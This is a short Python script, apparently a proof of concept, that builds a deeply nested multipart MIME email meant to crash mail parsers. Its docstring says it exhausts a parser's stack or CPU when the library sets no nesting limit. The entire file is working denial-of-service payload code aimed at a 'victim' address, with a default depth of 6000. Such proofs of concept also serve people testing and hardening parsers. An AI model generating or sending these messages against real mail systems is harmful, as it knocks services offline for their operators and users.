#!/usr/bin/env python3
"""Generate a nested-multipart MIME 'bomb' email (RFC822).

A small message whose multipart nesting depth is attacker-controlled.
Parsing it with a MIME library that imposes no nesting/part limit
exhausts the parser's stack (StackOverflowError) or CPU (super-linear
parse time)."""
import sys

def build(n: int) -> bytes:
    s = ["From: attacker@example.com\r\n",
         "To: victim@example.com\r\n",
         "Subject: nested-mime-dos\r\n",
         "Message-ID: <poc-%d@example.com>\r\n" % n,
         "MIME-Version: 1.0\r\n"]
    for i in range(n):
        s.append('Content-Type: multipart/mixed; boundary="B%d"\r\n\r\n' % i)
        s.append("--B%d\r\n" % i)
    s.append("Content-Type: text/plain\r\n\r\npayload\r\n")
    for i in range(n - 1, -1, -1):
        s.append("--B%d--\r\n" % i)
    return "".join(s).encode()

if __name__ == "__main__":
    n = int(sys.argv[1]) if len(sys.argv) > 1 else 6000
    out = sys.argv[2] if len(sys.argv) > 2 else "bomb.eml"
    data = build(n)
    open(out, "wb").write(data)
    print("wrote %s: nesting=%d, size=%.1f KB" % (out, n, len(data) / 1024))
